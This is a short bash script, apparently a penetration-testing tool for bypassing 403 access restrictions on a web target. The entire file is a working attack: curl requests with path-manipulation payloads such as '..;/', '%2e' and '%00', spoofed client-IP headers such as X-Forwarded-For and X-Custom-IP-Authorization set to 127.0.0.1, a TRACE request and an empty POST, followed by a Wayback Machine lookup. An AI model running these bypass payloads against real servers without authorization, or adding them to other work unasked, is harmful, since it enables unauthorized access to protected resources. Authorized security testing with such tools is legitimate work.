#!/bin/bash

# author: TinajaStyle
# inspired by: iamj0ker

target=$1

in_url ()
{
  curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $target$1
  echo "  --> $target$1"
}

in_header ()
{
  curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "$1" $target
  echo "  --> $target -H $1"
}

# Base
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $target
echo "  --> $target Base"

# In url
in_url "."

in_url "/"

in_url "./"

in_url "..//"

in_url "%2E%2F./"

in_url "%20"

in_url "%09"

in_url "%09.."

in_url "%2e"

in_url "?"

in_url "*"

in_url ".php"

in_url ".json"

in_url "..;"

in_url "..;/"

in_url ";/"

in_url "%0A"

in_url "%00"

in_url "?debug=true"

# In headers
in_header "X-Custom-IP-Authorization: 127.0.0.1"

in_header "X-Remote-Addr: 127.0.0.1"

in_header "X-Remote-Addr: 2130706433"

in_header "Proxy-Host: 127.0.0.1"

in_header "X-Forwarded-For: http://127.0.0.1"

in_header "X-Forwarded-For: 127.0.0.1:80"

in_header "X-Forwarded-For: 2130706433"

in_header "X-Forwarded-Host: 127.0.0.1"

in_header "X-Originally-Forwarded-For: localhost"

in_header "Client-IP: 127.0.0.1"

in_header "Real-Ip: 127.0.0.1"

in_header "Real-Ip: 2130706433"

in_header "Host: 127.0.0.1"

in_header "X-Rewrite-URL: 127.0.0.1"

in_header "X-True-IP: 127.0.0.1"

in_header "X-ProxyUser-Ip: 127.0.0.1"

in_header "X-Real-IP: 127.0.0.1"

in_header "X-Originating-IP: 127.0.0.1"

# Misc
P="TRACE"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X "$P" $target
echo "  --> $target -X $P"

P="Content-Length:0"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "$P" -X POST $target
echo "  --> $target -H $P -X POST"

echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$target | jq -r '.archived_snapshots.closest | {available, url}'

